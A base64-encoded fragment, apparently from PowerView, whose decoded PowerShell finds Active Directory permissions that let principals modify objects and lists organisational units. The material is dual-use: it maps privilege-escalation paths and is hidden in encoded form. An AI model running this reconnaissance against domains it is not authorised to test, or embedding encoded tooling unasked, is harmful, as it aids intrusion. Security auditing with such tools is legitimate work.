gdGhlIHJpZ2h0cyBmb3IKdGhlIEFDRSBtZWFuIHRoZSBvYmplY3QgY2FuIGJlIG1vZGlmaWVkIGJ5IHRoZSBwcmluY2lwYWwuIElmIHRoZXNlIGNvbmRpdGlvbnMgYXJlIG1ldCwKdGhlbiB0aGUgc2VjdXJpdHkgaWRlbnRpZmllciBTSUQgaXMgdHJhbnNsYXRlZCwgdGhlIGRvbWFpbiBvYmplY3QgaXMgcmV0cmlldmVkLCBhbmQKYWRkaXRpb25hbCBJZGVudGl0eVJlZmVyZW5jZSogaW5mb3JtYXRpb24gaXMgYXBwZW5kZWQgdG8gdGhlIG91dHB1dCBvYmplY3QuCgouUEFSQU1FVEVSIERvbWFpbgoKU3BlY2lmaWVzIHRoZSBkb21haW4gdG8gdXNlIGZvciB0aGUgcXVlcnksIGRlZmF1bHRzIHRvIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5QQVJBTUVURVIgUmVzb2x2ZUdVSURzCgpTd2l0Y2guIFJlc29sdmUgR1VJRHMgdG8gdGhlaXIgZGlzcGxheSBuYW1lcy4KCi5QQVJBTUVURVIgTERBUEZpbHRlcgoKU3BlY2lmaWVzIGFuIExEQVAgcXVlcnkgc3RyaW5nIHRoYXQgaXMgdXNlZCB0byBmaWx0ZXIgQWN0aXZlIERpcmVjdG9yeSBvYmplY3RzLgoKLlBBUkFNRVRFUiBTZWFyY2hCYXNlCgpUaGUgTERBUCBzb3VyY2UgdG8gc2VhcmNoIHRocm91Z2gsIGUuZy4gIkxEQVA6Ly9PVT1zZWNyZXQsREM9dGVzdGxhYixEQz1sb2NhbCIKVXNlZnVsIGZvciBPVSBxdWVyaWVzLgoKLlBBUkFNRVRFUiBTZXJ2ZXIKClNwZWNpZmllcyBhbiBBY3RpdmUgRGlyZWN0b3J5IHNlcnZlciAoZG9tYWluIGNvbnRyb2xsZXIpIHRvIGJpbmQgdG8uCgouUEFSQU1FVEVSIFNlYXJjaFNjb3BlCgpTcGVjaWZpZXMgdGhlIHNjb3BlIHRvIHNlYXJjaCB1bmRlciwgQmFzZS9PbmVMZXZlbC9TdWJ0cmVlIChkZWZhdWx0IG9mIFN1YnRyZWUpLgoKLlBBUkFNRVRFUiBSZXN1bHRQYWdlU2l6ZQoKU3BlY2lmaWVzIHRoZSBQYWdlU2l6ZSB0byBzZXQgZm9yIHRoZSBMREFQIHNlYXJjaGVyIG9iamVjdC4KCi5QQVJBTUVURVIgU2VydmVyVGltZUxpbWl0CgpTcGVjaWZpZXMgdGhlIG1heGltdW0gYW1vdW50IG9mIHRpbWUgdGhlIHNlcnZlciBzcGVuZHMgc2VhcmNoaW5nLiBEZWZhdWx0IG9mIDEyMCBzZWNvbmRzLgoKLlBBUkFNRVRFUiBUb21ic3RvbmUKClN3aXRjaC4gU3BlY2lmaWVzIHRoYXQgdGhlIHNlYXJjaGVyIHNob3VsZCBhbHNvIHJldHVybiBkZWxldGVkL3RvbWJzdG9uZWQgb2JqZWN0cy4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgdGFyZ2V0IGRvbWFpbi4KCi5FWEFNUExFCgpGaW5kLUludGVyZXN0aW5nRG9tYWluQWNsCgpGaW5kcyBpbnRlcmVzdGluZyBvYmplY3QgQUNMUyBpbiB0aGUgY3VycmVudCBkb21haW4uCgouRVhBTVBMRQoKRmluZC1JbnRlcmVzdGluZ0RvbWFpbkFjbCAtRG9tYWluIGRldi50ZXN0bGFiLmxvY2FsIC1SZXNvbHZlR1VJRHMKCkZpbmRzIGludGVyZXN0aW5nIG9iamVjdCBBQ0xTIGluIHRoZSBldi50ZXN0bGFiLmxvY2FsIGRvbWFpbiBhbmQKcmVzb2x2ZXMgcmlnaHRzIEdVSURzIHRvIGRpc3BsYXkgbmFtZXMuCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKRmluZC1JbnRlcmVzdGluZ0RvbWFpbkFjbCAtQ3JlZGVudGlhbCAkQ3JlZCAtUmVzb2x2ZUdVSURzCgouT1VUUFVUUwoKUG93ZXJWaWV3LkFDTAoKQ3VzdG9tIFBTT2JqZWN0IHdpdGggQUNMIGVudHJpZXMuCiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuQUNMJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0gKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnRG9tYWluTmFtZScsICdOYW1lJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRSZXNvbHZlR1VJRHMsCgogICAgICAgIFtTdHJpbmddCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdBbGwnLCAnUmVzZXRQYXNzd29yZCcsICdXcml0ZU1lbWJlcnMnKV0KICAgICAgICAkUmlnaHRzRmlsdGVyLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRmlsdGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkTERBUEZpbHRlciwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0FEU1BhdGgnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hCYXNlLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdCYXNlJywgJ09uZUxldmVsJywgJ1N1YnRyZWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hTY29wZSA9ICdTdWJ0cmVlJywKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRUb21ic3RvbmUsCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQoKICAgIEJFR0lOIHsKICAgICAgICAkQUNMQXJndW1lbnRzID0gQHt9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzb2x2ZUdVSURzJ10pIHsgJEFDTEFyZ3VtZW50c1snUmVzb2x2ZUdVSURzJ10gPSAkUmVzb2x2ZUdVSURzIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSaWdodHNGaWx0ZXInXSkgeyAkQUNMQXJndW1lbnRzWydSaWdodHNGaWx0ZXInXSA9ICRSaWdodHNGaWx0ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0xEQVBGaWx0ZXInXSkgeyAkQUNMQXJndW1lbnRzWydMREFQRmlsdGVyJ10gPSAkTERBUEZpbHRlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoQmFzZSddKSB7ICRBQ0xBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRTZWFyY2hCYXNlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkQUNMQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJEFDTEFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkQUNMQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkQUNMQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRBQ0xBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRBQ0xBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KCiAgICAgICAgJE9iamVjdFNlYXJjaGVyQXJndW1lbnRzID0gQHsKICAgICAgICAgICAgJ1Byb3BlcnRpZXMnID0gJ3NhbWFjY291bnRuYW1lLG9iamVjdGNsYXNzJwogICAgICAgICAgICAnUmF3JyA9ICRUcnVlCiAgICAgICAgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRPYmplY3RTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRPYmplY3RTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkT2JqZWN0U2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRPYmplY3RTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkT2JqZWN0U2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRPYmplY3RTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQoKICAgICAgICAkQUROYW1lQXJndW1lbnRzID0gQHt9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJEFETmFtZUFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJEFETmFtZUFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQoKICAgICAgICAjIG9uZ29pbmcgbGlzdCBvZiBidWlsdC11cCBTSURzCiAgICAgICAgJFJlc29sdmVkU0lEcyA9IEB7fQogICAgfQoKICAgIFBST0NFU1MgewogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7CiAgICAgICAgICAgICRBQ0xBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbgogICAgICAgICAgICAkQUROYW1lQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4KICAgICAgICB9CgogICAgICAgIEdldC1Eb21haW5PYmplY3RBY2wgQEFDTEFyZ3VtZW50cyB8IEZvckVhY2gtT2JqZWN0IHsKCiAgICAgICAgICAgIGlmICggKCRfLkFjdGl2ZURpcmVjdG9yeVJpZ2h0cyAtbWF0Y2ggJ0dlbmVyaWNBbGx8V3JpdGV8Q3JlYXRlfERlbGV0ZScpIC1vciAoKCRfLkFjdGl2ZURpcmVjdG9yeVJpZ2h0cyAtbWF0Y2ggJ0V4dGVuZGVkUmlnaHQnKSAtYW5kICgkXy5BY2VRdWFsaWZpZXIgLW1hdGNoICdBbGxvdycpKSkgewogICAgICAgICAgICAgICAgIyBvbmx5IHByb2Nlc3MgU0lEcyA+IDEwMDAKICAgICAgICAgICAgICAgIGlmICgkXy5TZWN1cml0eUlkZW50aWZpZXIuVmFsdWUgLW1hdGNoICdeUy0xLTUtLiotWzEtOV1cZHszLH0kJykgewogICAgICAgICAgICAgICAgICAgIGlmICgkUmVzb2x2ZWRTSURzWyRfLlNlY3VyaXR5SWRlbnRpZmllci5WYWx1ZV0pIHsKICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5UmVmZXJlbmNlTmFtZSwgJElkZW50aXR5UmVmZXJlbmNlRG9tYWluLCAkSWRlbnRpdHlSZWZlcmVuY2VETiwgJElkZW50aXR5UmVmZXJlbmNlQ2xhc3MgPSAkUmVzb2x2ZWRTSURzWyRfLlNlY3VyaXR5SWRlbnRpZmllci5WYWx1ZV0KCiAgICAgICAgICAgICAgICAgICAgICAgICRJbnRlcmVzdGluZ0FDTCA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAgICAgJEludGVyZXN0aW5nQUNMIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ09iamVjdEROJyAkXy5PYmplY3RETgogICAgICAgICAgICAgICAgICAgICAgICAkSW50ZXJlc3RpbmdBQ0wgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnQWNlUXVhbGlmaWVyJyAkXy5BY2VRdWFsaWZpZXIKICAgICAgICAgICAgICAgICAgICAgICAgJEludGVyZXN0aW5nQUNMIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ0FjdGl2ZURpcmVjdG9yeVJpZ2h0cycgJF8uQWN0aXZlRGlyZWN0b3J5UmlnaHRzCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkXy5PYmplY3RBY2VUeXBlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSW50ZXJlc3RpbmdBQ0wgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnT2JqZWN0QWNlVHlwZScgJF8uT2JqZWN0QWNlVHlwZQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEludGVyZXN0aW5nQUNMIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ09iamVjdEFjZVR5cGUnICdOb25lJwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICRJbnRlcmVzdGluZ0FDTCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdBY2VGbGFncycgJF8uQWNlRmxhZ3MKICAgICAgICAgICAgICAgICAgICAgICAgJEludGVyZXN0aW5nQUNMIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ0FjZVR5cGUnICRfLkFjZVR5cGUKICAgICAgICAgICAgICAgICAgICAgICAgJEludGVyZXN0aW5nQUNMIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ0luaGVyaXRhbmNlRmxhZ3MnICRfLkluaGVyaXRhbmNlRmxhZ3MKICAgICAgICAgICAgICAgICAgICAgICAgJEludGVyZXN0aW5nQUNMIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ1NlY3VyaXR5SWRlbnRpZmllcicgJF8uU2VjdXJpdHlJZGVudGlmaWVyCiAgICAgICAgICAgICAgICAgICAgICAgICRJbnRlcmVzdGluZ0FDTCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdJZGVudGl0eVJlZmVyZW5jZU5hbWUnICRJZGVudGl0eVJlZmVyZW5jZU5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJEludGVyZXN0aW5nQUNMIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ0lkZW50aXR5UmVmZXJlbmNlRG9tYWluJyAkSWRlbnRpdHlSZWZlcmVuY2VEb21haW4KICAgICAgICAgICAgICAgICAgICAgICAgJEludGVyZXN0aW5nQUNMIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ0lkZW50aXR5UmVmZXJlbmNlRE4nICRJZGVudGl0eVJlZmVyZW5jZUROCiAgICAgICAgICAgICAgICAgICAgICAgICRJbnRlcmVzdGluZ0FDTCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdJZGVudGl0eVJlZmVyZW5jZUNsYXNzJyAkSWRlbnRpdHlSZWZlcmVuY2VDbGFzcwogICAgICAgICAgICAgICAgICAgICAgICAkSW50ZXJlc3RpbmdBQ0wKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eVJlZmVyZW5jZUROID0gQ29udmVydC1BRE5hbWUgLUlkZW50aXR5ICRfLlNlY3VyaXR5SWRlbnRpZmllci5WYWx1ZSAtT3V0cHV0VHlwZSBETiBAQUROYW1lQXJndW1lbnRzCiAgICAgICAgICAgICAgICAgICAgICAgICMgIklkZW50aXR5UmVmZXJlbmNlRE46ICRJZGVudGl0eVJlZmVyZW5jZUROIgoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRJZGVudGl0eVJlZmVyZW5jZUROKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlSZWZlcmVuY2VEb21haW4gPSAkSWRlbnRpdHlSZWZlcmVuY2VETi5TdWJTdHJpbmcoJElkZW50aXR5UmVmZXJlbmNlRE4uSW5kZXhPZignREM9JykpIC1yZXBsYWNlICdEQz0nLCcnIC1yZXBsYWNlICcsJywnLicKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgIklkZW50aXR5UmVmZXJlbmNlRG9tYWluOiAkSWRlbnRpdHlSZWZlcmVuY2VEb21haW4iCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkT2JqZWN0U2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJElkZW50aXR5UmVmZXJlbmNlRG9tYWluCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkT2JqZWN0U2VhcmNoZXJBcmd1bWVudHNbJ0lkZW50aXR5J10gPSAkSWRlbnRpdHlSZWZlcmVuY2VETgogICAgICAgICAgICAgICAgICAgICAgICAgICAgIyAiSWRlbnRpdHlSZWZlcmVuY2VETjogJElkZW50aXR5UmVmZXJlbmNlRE4iCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkT2JqZWN0ID0gR2V0LURvbWFpbk9iamVjdCBAT2JqZWN0U2VhcmNoZXJBcmd1bWVudHMKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJE9iamVjdCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eVJlZmVyZW5jZU5hbWUgPSAkT2JqZWN0LlByb3BlcnRpZXMuc2FtYWNjb3VudG5hbWVbMF0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJE9iamVjdC5Qcm9wZXJ0aWVzLm9iamVjdGNsYXNzIC1tYXRjaCAnY29tcHV0ZXInKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eVJlZmVyZW5jZUNsYXNzID0gJ2NvbXB1dGVyJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYgKCRPYmplY3QuUHJvcGVydGllcy5vYmplY3RjbGFzcyAtbWF0Y2ggJ2dyb3VwJykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlSZWZlcmVuY2VDbGFzcyA9ICdncm91cCcKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZWlmICgkT2JqZWN0LlByb3BlcnRpZXMub2JqZWN0Y2xhc3MgLW1hdGNoICd1c2VyJykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlSZWZlcmVuY2VDbGFzcyA9ICd1c2VyJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5UmVmZXJlbmNlQ2xhc3MgPSAkTnVsbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBzYXZlIHNvIHdlIGRvbid0IGxvb2sgdXAgbW9yZSB0aGFuIG9uY2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUmVzb2x2ZWRTSURzWyRfLlNlY3VyaXR5SWRlbnRpZmllci5WYWx1ZV0gPSAkSWRlbnRpdHlSZWZlcmVuY2VOYW1lLCAkSWRlbnRpdHlSZWZlcmVuY2VEb21haW4sICRJZGVudGl0eVJlZmVyZW5jZUROLCAkSWRlbnRpdHlSZWZlcmVuY2VDbGFzcwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSW50ZXJlc3RpbmdBQ0wgPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEludGVyZXN0aW5nQUNMIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ09iamVjdEROJyAkXy5PYmplY3RETgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJbnRlcmVzdGluZ0FDTCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdBY2VRdWFsaWZpZXInICRfLkFjZVF1YWxpZmllcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJbnRlcmVzdGluZ0FDTCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdBY3RpdmVEaXJlY3RvcnlSaWdodHMnICRfLkFjdGl2ZURpcmVjdG9yeVJpZ2h0cwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkXy5PYmplY3RBY2VUeXBlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJbnRlcmVzdGluZ0FDTCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdPYmplY3RBY2VUeXBlJyAkXy5PYmplY3RBY2VUeXBlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSW50ZXJlc3RpbmdBQ0wgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnT2JqZWN0QWNlVHlwZScgJ05vbmUnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJbnRlcmVzdGluZ0FDTCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdBY2VGbGFncycgJF8uQWNlRmxhZ3MKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSW50ZXJlc3RpbmdBQ0wgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnQWNlVHlwZScgJF8uQWNlVHlwZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJbnRlcmVzdGluZ0FDTCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdJbmhlcml0YW5jZUZsYWdzJyAkXy5Jbmhlcml0YW5jZUZsYWdzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEludGVyZXN0aW5nQUNMIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ1NlY3VyaXR5SWRlbnRpZmllcicgJF8uU2VjdXJpdHlJZGVudGlmaWVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEludGVyZXN0aW5nQUNMIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ0lkZW50aXR5UmVmZXJlbmNlTmFtZScgJElkZW50aXR5UmVmZXJlbmNlTmFtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJbnRlcmVzdGluZ0FDTCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdJZGVudGl0eVJlZmVyZW5jZURvbWFpbicgJElkZW50aXR5UmVmZXJlbmNlRG9tYWluCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEludGVyZXN0aW5nQUNMIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ0lkZW50aXR5UmVmZXJlbmNlRE4nICRJZGVudGl0eVJlZmVyZW5jZUROCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEludGVyZXN0aW5nQUNMIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ0lkZW50aXR5UmVmZXJlbmNlQ2xhc3MnICRJZGVudGl0eVJlZmVyZW5jZUNsYXNzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEludGVyZXN0aW5nQUNMCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbRmluZC1JbnRlcmVzdGluZ0RvbWFpbkFjbF0gVW5hYmxlIHRvIGNvbnZlcnQgU0lEICckKCRfLlNlY3VyaXR5SWRlbnRpZmllci5WYWx1ZSApJyB0byBhIGRpc3Rpbmd1aXNoZWRuYW1lIHdpdGggQ29udmVydC1BRE5hbWUiCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBHZXQtRG9tYWluT1Ugewo8IwouU1lOT1BTSVMKClNlYXJjaCBmb3IgYWxsIG9yZ2FuaXphdGlvbiB1bml0cyAoT1VzKSBvciBzcGVjaWZpYyBPVSBvYmplY3RzIGluIEFELgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBHZXQtRG9tYWluU2VhcmNoZXIsIENvbnZlcnQtTERBUFByb3BlcnR5ICAKCi5ERVNDUklQVElPTgoKQnVpbGRzIGEgZGlyZWN0b3J5IHNlYXJjaGVyIG9iamVjdCB1c2luZyBHZXQtRG9tYWluU2VhcmNoZXIsIGJ1aWxkcyBhIGN1c3RvbQpMREFQIGZpbHRlciBiYXNlZCBvbiB0YXJnZXRpbmcvZmlsdGVyIHBhcmFtZXRlcnMsIGFuZCBzZWFyY2hlcyBmb3IgYWxsIG9iamVjdHMKbWF0Y2hpbmcgdGhlIGNyaXRlcmlhLiBUbyBvbmx5IHJldHVybiBzcGVjaWZpYyBwcm9wZXJ0aWVzLCB1c2UKIi1Qcm9wZXJ0aWVzIHdoZW5jcmVhdGVkLHVzbmNoYW5nZWQsLi4uIi4gQnkgZGVmYXVsdCwgYWxsIE9VIG9iamVjdHMgZm9yCnRoZSBjdXJyZW50IGRvbWFpbiBhcmUgcmV0dXJuZWQuCgouUEFSQU1FVEVSIElkZW50aXR5CgpBbiBPVSBuYW1lIChlLmcuIFRlc3RPVSksIERpc3Rpbmd1aXNoZWROYW1lIChlLmcuIE9VPVRlc3RPVSxEQz10ZXN0bGFiLERDPWxvY2FsKSwgb3IKR1VJRCAoZS5nLiA4YTliYTIyYS04OTc3LTQ3ZTYtODRjZS04YzI2YWY0ZTFlNmEpLiBXaWxkY2FyZHMgYW